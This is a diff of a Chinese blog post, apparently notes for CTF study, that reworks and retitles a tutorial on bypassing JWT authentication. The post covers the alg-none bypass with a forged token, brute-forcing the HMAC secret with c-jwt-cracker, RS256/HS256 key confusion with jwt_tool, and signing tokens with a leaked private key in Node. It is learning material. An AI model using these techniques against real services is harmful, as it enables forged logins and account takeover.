@@ -19,22 +19,22 @@
   <meta name="author" content="uert">
   <meta name="keywords" content="">
   
-    <meta name="description" content="JWT jwt是一个轻量级的认证规范 对数据进行签名用的 防止数据被篡改1 对数据进行加密   内容对用户敏感，不需要对外2 对数据进行签名   内容不敏感，但是确保不被篡改 JWT是对数据进行签名，防止数据篡改，而不是防止数据被读取JSON Web Token JWT?username&#x3D;admin&amp;score&#x3D;100  别人传递过程中，会对积分进行篡改?usernam">
+    <meta name="description" content="JWTjwt是一个轻量级的认证规范 对数据进行签名用的 防止数据被篡改  对数据进行加密   内容对用户敏感，不需要对外 对数据进行签名   内容不敏感，但是确保不被篡改  JWT是对数据进行签名，防止数据篡改，而不是防止数据被读取JSON Web Token (JWT)?username&#x3D;admin&amp;score&#x3D;100  别人传递过程中，会对积分进行篡改?userna">
 <meta property="og:type" content="article">
-<meta property="og:title" content="jwt等认证">
-<meta property="og:url" content="https://theganlove.github.io/2024/09/01/jwt%E7%AD%89%E8%AE%A4%E8%AF%81went/index.html">
+<meta property="og:title" content="JWT认证绕过">
+<meta property="og:url" content="https://theganlove.github.io/2024/08/31/jwt%E7%AD%89%E8%AE%A4%E8%AF%81went/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="JWT jwt是一个轻量级的认证规范 对数据进行签名用的 防止数据被篡改1 对数据进行加密   内容对用户敏感，不需要对外2 对数据进行签名   内容不敏感，但是确保不被篡改 JWT是对数据进行签名，防止数据篡改，而不是防止数据被读取JSON Web Token JWT?username&#x3D;admin&amp;score&#x3D;100  别人传递过程中，会对积分进行篡改?usernam">
+<meta property="og:description" content="JWTjwt是一个轻量级的认证规范 对数据进行签名用的 防止数据被篡改  对数据进行加密   内容对用户敏感，不需要对外 对数据进行签名   内容不敏感，但是确保不被篡改  JWT是对数据进行签名，防止数据篡改，而不是防止数据被读取JSON Web Token (JWT)?username&#x3D;admin&amp;score&#x3D;100  别人传递过程中，会对积分进行篡改?userna">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-09-01T12:48:22.000Z">
-<meta property="article:modified_time" content="2024-09-07T15:02:52.813Z">
+<meta property="article:published_time" content="2024-08-31T04:54:18.000Z">
+<meta property="article:modified_time" content="2024-09-08T13:28:45.413Z">
 <meta property="article:author" content="uert">
-<meta property="article:tag" content="web js">
+<meta property="article:tag" content="认证绕过">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>jwt等认证 - Hexo</title>
+  <title>JWT认证绕过 - Hexo</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -200,7 +200,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="jwt等认证"></span>
+            <span id="subtitle" data-typed-text="JWT认证绕过"></span>
           
         </div>
 
@@ -211,8 +211,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-09-01 20:48" pubdate>
-          2024年9月1日 晚上
+        <time datetime="2024-08-31 12:54" pubdate>
+          2024年8月31日 下午
         </time>
       </span>
     
@@ -271,44 +271,69 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">jwt等认证</h1>
+            <h1 id="seo-header">JWT认证绕过</h1>
             
             
               <div class="markdown-body">
                 
-                <p>JWT</p>
-<p>jwt是一个轻量级的认证规范 对数据进行签名用的</p>
-<p>防止数据被篡改<br>1 对数据进行加密   内容对用户敏感，不需要对外<br>2 对数据进行签名   内容不敏感，但是确保不被篡改</p>
-<p>JWT是对数据进行签名，防止数据篡改，而不是防止数据被读取<br>JSON Web Token JWT<br>?username&#x3D;admin&amp;score&#x3D;100  别人传递过程中，会对积分进行篡改<br>?username&#x3D;admin&amp;score&#x3D;100&amp;token&#x3D;c17961f5f372f8cf039113909d715943<br>? md5(score&#x3D;100&amp;username&#x3D;admin)&#x3D;c17961f5f372f8cf039113909d715943<br>?score&#x3D;100&amp;username&#x3D;admin&amp;token&#x3D;c17961ff372f8cf039113909d715943<br>篡改数据的同时，破解了算法，篡改了签名<br>加盐机制，salt<br>md5(score&#x3D;100&amp;username&#x3D;admin_ctfshow)&#x3D;20f3fa445b286df3f1a518fcbcd8bbe2</p>
-<p>盐值有可能被爆破，也有可能被泄露<br>增加更高的密码算法，不再简单的md5，盐值也大幅度提高长度，达到几百上千位 来保证我们的数据不被篡改  或者即使篡改了我们能发现<br>由 Header、Payload、Signature三部分构成，用点分隔，数据采用Base64URL进行编码<br>Header是JWT的第一个部分，是一个 JSON 对象，主要声明了JWT的签名算法，如“HS256”、“RS256”等，以及其他可选参数，如“kid”等。<br>Header</p>
-<p>{<br>    “alg” : “HS256”,<br>    “typ” : “jwt”<br>}<br>Payload是JWT的第二个部分，这也是一个 JSON 对象，主要承载了各种声明并传递明文数据，一般用于存储用户的信息，如 id、用户名、角色、令牌生成时间和其他自定义声明<br>Payload<br>{<br>    “user” : “Admin”<br>}<br>Signature<br>    Signature 是对 Header 和 Payload 进行签名，具体是用什么加密方式写在 Header的alg中。同时拥有该部分的JWT被称为JWS，也就是签了名的JWT。<br>    Signature的功能是保护token完整性。<br>生成方法为将header和payload两个部分联结起来，然后通过header部分指定的算法，计算出签名。抽象成公式就是：signature &#x3D; HMAC-SHA256(base64urlEncode(header) + ‘.’ + base64urlEncode(payload), secret_key)<br>值得注意的是，编码header和payload时使用的编码方式为base64urlencode，base64url编码是base64的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”&#x3D;”号，并将标准Base64中的”+”和”&#x2F;“分别改成了”-“和”_”。</p>
-<p>JWT生成-在线网址&amp;工具<br>python3 flask_session_cookie_manager3.py encode -s ‘secret_key’ -t ‘{“admin”:True,”username”:”admin”}’</p>
-<p>漏洞点</p>
-<p>1 当不校验算法时，我们可以替换算法，甚至可以使用空的算法，来达到数据篡改目的<br>{<br>    “alg” : “None”,<br>    “typ” : “jwt”<br>}<br>{<br>    “user” : “Admin”<br>}<br>{“alg”:”None”,”typ”:”JWT”}<br>{“iss”:”admin”,”iat”:1673703091,”exp”:1673710291,”nbf”:1673703091,”sub”:”admin”,”jti”:”21a3d6eec9efbc030983fbc3650c0f03”}</p>
-<p>ewogICAgImFsZyIgOiAiTm9uZSIsCiAgICAidHlwIiA6ICJqd3QiCn0&#x3D;.ewogICAgInVzZXIiIDogImFkbWluIgp9</p>
-<p>JWT 爆破工具地址<br><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a><br>docker build . -t jwtcrack<br>docker run -it –rm  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE</p>
-<p>密钥混淆攻击<br>    JWT最常用的两种算法是HMAC和RSA。HMAC用同一个密钥对token进行签名和认证。而RSA需要两个密钥，先用私钥加密生成JWT，然后使用其对应的公钥来解密验证。那么，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。由于公钥有时可以被攻击者获取到，所以攻击者可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名。<br>     利用方式：jwt_tool(<a target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a>)<br>     用法：python3 jwt_tool.py token_here -pk pubkey -T -S hs256<br>密钥爆破&#x2F;泄露<br>    HMAC签名密钥（例如HS256 &#x2F; HS384 &#x2F; HS512）使用对称加密，这意味着对令牌进行签名的密钥也用于对其进行验证。由于签名验证是一个自包含的过程，因此可以测试令牌本身的有效密钥，而不必将其发送回应用程序进行验证。<br>    因此，jwtcrack破解是JWT破解工具，可以通过穷举的方式暴力破解密钥。<br>    如果可以破解HMAC密钥，则可以伪造令牌中的任何内容，这个漏洞将会给系统带来非常严重的后果，所以在加密时不要使用弱密钥进行加密。<br>    jwtcrack(<a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a>)<br>    用法：.&#x2F;jwtcrack token_here</p>
-<p>node安装jwt命令</p>
-<p>npm install jsonwebtoken</p>
-<p>1 私钥泄露</p>
-<p>可以根据私钥生成任意的jwt字符串</p>
-<p>const jwt &#x3D; require(‘jsonwebtoken’);<br>const fs &#x3D; require(‘fs’);</p>
-<p>var privateKey &#x3D; fs.readFileSync(‘private.key’);</p>
-<p>var token &#x3D; jwt.sign({ user: ‘admin’ }, privateKey, { algorithm: ‘RS256’ });<br>console.log(token)<br>验签</p>
-<p>2 公钥泄露</p>
-<p>可以根据公钥，修改算法从非对称算法 到 对称密钥算法  </p>
-<p>双方都使用公钥验签，顺利篡改数据</p>
-<p>当公钥可以拿到时，如果使用对称密码，则对面使用相同的公钥进行解密</p>
-<p>实现验签通过</p>
-<p>总结加密方式</p>
-<p>1 非对称加密算法  私钥  公钥   只要两个时匹配 一个私钥加密的文件，用公钥都能解开(验签)</p>
-<p>2 对称加密算法   暗号  口令  公钥 </p>
-<p>总结jwt攻击</p>
-<p>1 空密码算法绕过 不验证算法的前提下</p>
-<p>2 弱密码绕过   猜测弱密码</p>
-<p>3 密码爆破   安装docker 执行jwtcracker</p>
-<p>4 私钥泄露  直接利用私钥生成正确jwt字符串 过验签</p>
-<p>5 公钥泄露  不验证算法前提下，修改算法为对称加密，通过公钥重新生成对称签名的字符串 实现验签通过</p>
+                <h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><p>jwt是一个轻量级的认证规范 对数据进行签名用的</p>
+<p>防止数据被篡改</p>
+<ol>
+<li>对数据进行加密   内容对用户敏感，不需要对外</li>
+<li>对数据进行签名   内容不敏感，但是确保不被篡改</li>
+</ol>
+<p>JWT是对数据进行签名，防止数据篡改，而不是防止数据被读取<br>JSON Web Token (JWT)<br>?username&#x3D;admin&amp;score&#x3D;100  别人传递过程中，会对积分进行篡改<br>?username&#x3D;admin&amp;score&#x3D;100&amp;token&#x3D;c17961f5f372f8cf039113909d715943<br>? md5(score&#x3D;100&amp;username&#x3D;admin)&#x3D;c17961f5f372f8cf039113909d715943<br>?score&#x3D;100&amp;username&#x3D;admin&amp;token&#x3D;c17961ff372f8cf039113909d715943<br>篡改数据的同时，破解了算法，篡改了签名<br>加盐机制，salt<br>md5(score&#x3D;100&amp;username&#x3D;admin_ctfshow)&#x3D;20f3fa445b286df3f1a518fcbcd8bbe2</p>
+<p>盐值有可能被爆破，也有可能被泄露<br>增加更高的密码算法，不再简单的md5，盐值也大幅度提高长度，达到几百上千位 来保证我们的数据不被篡改  或者即使篡改了我们能发现<br>由 Header、Payload、Signature 三部分构成，用点分隔，数据采用Base64URL进行编码</p>
+<h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>Header是JWT的第一个部分，是一个 JSON 对象，主要声明了JWT的签名算法，如“HS256”、“RS256”等，以及其他可选参数，如“kid”等。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;alg&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;typ&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jwt&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;user&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h2><p>Signature 是对 Header 和 Payload 进行签名，具体是用什么加密方式写在 Header 的 alg 中。同时拥有该部分的JWT被称为JWS，也就是签了名的JWT。Signature的功能是保护token完整性。</p>
+<p>生成方法为将 header 和 payload 两个部分联结起来，然后通过 header 部分指定的算法，计算出签名。抽象成公式就是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">signature = HMAC-SHA256(base64urlEncode(header) + <span class="hljs-string">&#x27;.&#x27;</span> + base64urlEncode(payload), secret_key)<br></code></pre></td></tr></table></figure>
+
+<p>值得注意的是，编码 header 和 payload 时使用的编码方式为 base64urlencode，base64url 编码是 base64 的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”&#x3D;”号，并将标准 Base64 中的 “+” 和 “&#x2F;“ 分别改成了 “-“ 和 “_”。</p>
+<h2 id="JWT生成-在线网址-工具"><a href="#JWT生成-在线网址-工具" class="headerlink" title="JWT生成-在线网址&amp;工具"></a>JWT生成-在线网址&amp;工具</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;secret_key&#x27;</span> -t <span class="hljs-string">&#x27;&#123;&quot;admin&quot;:True,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><ol>
+<li>当不校验算法时，我们可以替换算法，甚至可以使用空的算法，来达到数据篡改目的：</li>
+</ol>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;alg&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;typ&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jwt&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;user&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;JWT&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;iss&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;iat&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673703091</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;exp&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673710291</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;nbf&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1673703091</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;sub&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;jti&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;21a3d6eec9efbc030983fbc3650c0f03&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ewogICAgImFsZyIgOiAiTm9uZSIsCiAgICAidHlwIiA6ICJqd3QiCn0=.ewogICAgInVzZXIiIDogImFkbWluIgp9<br></code></pre></td></tr></table></figure>
+
+<h2 id="JWT-爆破工具地址"><a href="#JWT-爆破工具地址" class="headerlink" title="JWT 爆破工具地址"></a>JWT 爆破工具地址</h2><p><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build . -t jwtcrack<br>docker run -it --<span class="hljs-built_in">rm</span>  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE<br></code></pre></td></tr></table></figure>
+
+<h2 id="密钥混淆攻击"><a href="#密钥混淆攻击" class="headerlink" title="密钥混淆攻击"></a>密钥混淆攻击</h2><p>JWT最常用的两种算法是HMAC和RSA。HMAC用同一个密钥对token进行签名和认证。而RSA需要两个密钥，先用私钥加密生成JWT，然后使用其对应的公钥来解密验证。那么，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。由于公钥有时可以被攻击者获取到，所以攻击者可以修改 header 中算法为HS256，然后使用RSA公钥对数据进行签名。</p>
+<p>利用方式：<a target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool">jwt_tool</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 jwt_tool.py token_here -pk pubkey -T -S hs256<br></code></pre></td></tr></table></figure>
+
+<h2 id="密钥爆破-泄露"><a href="#密钥爆破-泄露" class="headerlink" title="密钥爆破&#x2F;泄露"></a>密钥爆破&#x2F;泄露</h2><p>HMAC签名密钥（例如HS256 &#x2F; HS384 &#x2F; HS512）使用对称加密，这意味着对令牌进行签名的密钥也用于对其进行验证。由于签名验证是一个自包含的过程，因此可以测试令牌本身的有效密钥，而不必将其发送回应用程序进行验证。</p>
+<p>因此，jwtcrack破解是JWT破解工具，可以通过穷举的方式暴力破解密钥。如果可以破解HMAC密钥，则可以伪造令牌中的任何内容，这个漏洞将会给系统带来非常严重的后果，所以在加密时不要使用弱密钥进行加密。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">jwtcrack</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./jwtcrack token_here<br></code></pre></td></tr></table></figure>
+
+<h2 id="node安装jwt命令"><a href="#node安装jwt命令" class="headerlink" title="node安装jwt命令"></a>node安装jwt命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install jsonwebtoken<br></code></pre></td></tr></table></figure>
+
+<h3 id="1-私钥泄露"><a href="#1-私钥泄露" class="headerlink" title="1. 私钥泄露"></a>1. 私钥泄露</h3><p>可以根据私钥生成任意的jwt字符串：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;private.key&#x27;</span>);<br><br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token);<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-公钥泄露"><a href="#2-公钥泄露" class="headerlink" title="2. 公钥泄露"></a>2. 公钥泄露</h3><p>可以根据公钥，修改算法从非对称算法到对称密钥算法。双方都使用公钥验签，顺利篡改数据。当公钥可以拿到时，如果使用对称密码，则对面使用相同的公钥进行解密，实现验签通过。</p>
+<h2 id="总结加密方式"><a href="#总结加密方式" class="headerlink" title="总结加密方式"></a>总结加密方式</h2><ol>
+<li><p><strong>非对称加密算法</strong>：私钥、公钥。只要两个时匹配，一个私钥加密的文件，用公钥都能解开(验签)。</p>
+</li>
+<li><p><strong>对称加密算法</strong>：暗号、口令、公钥。</p>
+</li>
+</ol>
+<h2 id="总结jwt攻击"><a href="#总结jwt攻击" class="headerlink" title="总结jwt攻击"></a>总结jwt攻击</h2><ol>
+<li>空密码算法绕过：不验证算法的前提下。</li>
+<li>弱密码绕过：猜测弱密码。</li>
+<li>密码爆破：安装docker，执行jwtcracker。</li>
+<li>私钥泄露：直接利用私钥生成正确jwt字符串，过验签。</li>
+<li>公钥泄露：不验证算法前提下，修改算法为对称加密，通过公钥重新生成对称签名的字符串，实现验签通过。</li>
+</ol>
 
                 
               </div>
@@ -332,7 +357,7 @@
   
     <span>></span>
     
-  <a href="/categories/CTF-web/js/" class="category-chain-item">js</a>
+  <a href="/categories/CTF-web/JWT/" class="category-chain-item">JWT</a>
   
   
 
@@ -349,7 +374,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/web-js/" class="print-no-link">#web js</a>
+        <a href="/tags/%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/" class="print-no-link">#认证绕过</a>
       
     </div>
   
@@ -361,8 +386,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>jwt等认证</div>
-      <div>https://theganlove.github.io/2024/09/01/jwt等认证went/</div>
+      <div>JWT认证绕过</div>
+      <div>https://theganlove.github.io/2024/08/31/jwt等认证went/</div>
     </div>
     <div class="license-meta">
       
@@ -374,7 +399,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年9月1日</div>
+          <div>2024年8月31日</div>
         </div>
       
       
@@ -406,9 +431,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/09/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="js原型链污染">
+                      <a href="/2024/08/31/%E5%BE%AA%E7%8E%AF%E5%B5%8C%E5%A5%97%E5%87%BD%E6%95%B0GetShell/" title="循环嵌套函数GetShell">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">js原型链污染</span>
+                        <span class="hidden-mobile">循环嵌套函数GetShell</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -416,8 +441,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/09/01/SSTI/" title="SSTI">
-                        <span class="hidden-mobile">SSTI</span>
+                      <a href="/2024/08/31/%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85php%E5%92%8Capache/" title="源码编译安装php和apache">
+                        <span class="hidden-mobile">源码编译安装php和apache</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
